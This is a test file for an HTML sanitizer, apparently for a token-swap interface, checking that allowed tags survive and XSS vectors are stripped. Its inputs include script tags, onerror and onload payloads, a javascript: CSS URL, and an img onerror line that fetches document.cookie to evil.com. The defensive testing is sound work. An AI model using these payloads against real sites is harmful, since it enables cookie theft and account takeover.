import { sanitizeHtml } from "./sanitize-html";

// ──────────────────────────────────────────────
// 1. Preserves allowed tags
// ──────────────────────────────────────────────
describe("sanitizeHtml — preserves allowed tags", () => {
  it("should preserve div and span tags", () => {
    const input = "<div>Swapping <span>100</span> <span>GNOT</span></div>";
    expect(sanitizeHtml(input)).toBe(input);
  });

  it("should preserve p, b, strong, em, br tags", () => {
    const input = "<p>Hello <b>bold</b> <strong>strong</strong> <em>italic</em><br/></p>";
    const result = sanitizeHtml(input);
    expect(result).toContain("<b>bold</b>");
    expect(result).toContain("<strong>strong</strong>");
    expect(result).toContain("<em>italic</em>");
  });

  it("should preserve class attribute", () => {
    const input = "<span class=\"highlight\">text</span>";
    expect(sanitizeHtml(input)).toBe(input);
  });
});

// ──────────────────────────────────────────────
// 2. Strips dangerous tags
// ──────────────────────────────────────────────
describe("sanitizeHtml — strips dangerous tags", () => {
  it("should strip script tags", () => {
    const input = "<div>Hello<script>alert(\"xss\")</script></div>";
    const result = sanitizeHtml(input);
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert");
    expect(result).toContain("Hello");
  });

  it("should strip img with onerror handler", () => {
    const input = "<img src=x onerror=\"alert(1)\">";
    const result = sanitizeHtml(input);
    expect(result).not.toContain("onerror");
    expect(result).not.toContain("alert");
  });

  it("should strip iframe tags", () => {
    const input = "<iframe src=\"https://evil.com\"></iframe>";
    const result = sanitizeHtml(input);
    expect(result).not.toContain("<iframe");
  });

  it("should strip object tags", () => {
    const input = "<object data=\"evil.swf\"></object>";
    const result = sanitizeHtml(input);
    expect(result).not.toContain("<object");
  });

  it("should strip svg with onload handler", () => {
    const input = "<svg onload=\"alert(1)\"></svg>";
    const result = sanitizeHtml(input);
    expect(result).not.toContain("onload");
    expect(result).not.toContain("alert");
  });
});

// ──────────────────────────────────────────────
// 3. Strips event handler attributes
// ──────────────────────────────────────────────
describe("sanitizeHtml — strips event handlers", () => {
  it("should strip on* event handlers from allowed tags", () => {
    const input = "<div onclick=\"alert(1)\">click me</div>";
    const result = sanitizeHtml(input);
    expect(result).not.toContain("onclick");
    expect(result).toContain("click me");
  });

  it("should strip onmouseover event", () => {
    const input = "<span onmouseover=\"steal()\">hover</span>";
    const result = sanitizeHtml(input);
    expect(result).not.toContain("onmouseover");
    expect(result).toContain("hover");
  });
});

// ──────────────────────────────────────────────
// 4. Token symbol XSS vectors (real attack scenarios)
// ──────────────────────────────────────────────
describe("sanitizeHtml — token symbol XSS vectors", () => {
  it("should strip script injection via token symbol", () => {
    const maliciousSymbol = "</span><script>alert(document.cookie)</script><span>";
    const template = `<div>Swapping <span>100</span> <span>${maliciousSymbol}</span></div>`;
    const result = sanitizeHtml(template);
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert");
  });

  it("should strip img onerror injection via token symbol", () => {
    const maliciousSymbol = "</span><img src=x onerror=\"fetch('https://evil.com/steal?c='+document.cookie)\"><span>";
    const template = `<div>Added <span>500</span> <span>${maliciousSymbol}</span> as incentives</div>`;
    const result = sanitizeHtml(template);
    expect(result).not.toContain("onerror");
    expect(result).not.toContain("fetch");
  });

  it("should strip SVG XSS injection via token symbol", () => {
    const maliciousSymbol = "</span><svg/onload=alert(1)><span>";
    const template = `<div>Swapping <span>${maliciousSymbol}</span></div>`;
    const result = sanitizeHtml(template);
    expect(result).not.toContain("onload");
    expect(result).not.toContain("alert");
  });
});

// ──────────────────────────────────────────────
// 5. i18n interpolation patterns (real usage)
// ──────────────────────────────────────────────
describe("sanitizeHtml — i18n interpolation patterns", () => {
  it("should preserve valid swap message", () => {
    const input = "<div>Swapping <span>1,000</span> <span>GNOT</span> and <span>500</span> <span>USDT</span></div>";
    expect(sanitizeHtml(input)).toBe(input);
  });

  it("should preserve valid incentive message", () => {
    const input = "<div>Added <span>10,000</span> <span>GNS</span> as incentives</div>";
    expect(sanitizeHtml(input)).toBe(input);
  });

  it("should preserve valid proposal cancel message", () => {
    const input = "<div>Cancelled proposal <span>#42</span></div>";
    expect(sanitizeHtml(input)).toBe(input);
  });
});

// ──────────────────────────────────────────────
// 6. Edge cases
// ──────────────────────────────────────────────
describe("sanitizeHtml — edge cases", () => {
  it("should return empty string for empty input", () => {
    expect(sanitizeHtml("")).toBe("");
  });

  it("should return plain text as-is", () => {
    expect(sanitizeHtml("Hello World")).toBe("Hello World");
  });

  it("should preserve HTML entities", () => {
    const input = "<span>&lt;script&gt;</span>";
    const result = sanitizeHtml(input);
    expect(result).toContain("&lt;script&gt;");
  });

  it("should strip nested dangerous tags", () => {
    const input = "<div><div><script>alert(1)</script></div></div>";
    const result = sanitizeHtml(input);
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert");
  });

  it("should strip style attribute to prevent CSS injection", () => {
    const input = "<div style=\"background:url(javascript:alert(1))\">text</div>";
    const result = sanitizeHtml(input);
    expect(result).not.toContain("style");
    expect(result).toContain("text");
  });

  it("should strip data attributes", () => {
    const input = "<div data-evil=\"payload\">text</div>";
    const result = sanitizeHtml(input);
    expect(result).not.toContain("data-evil");
    expect(result).toContain("text");
  });
});
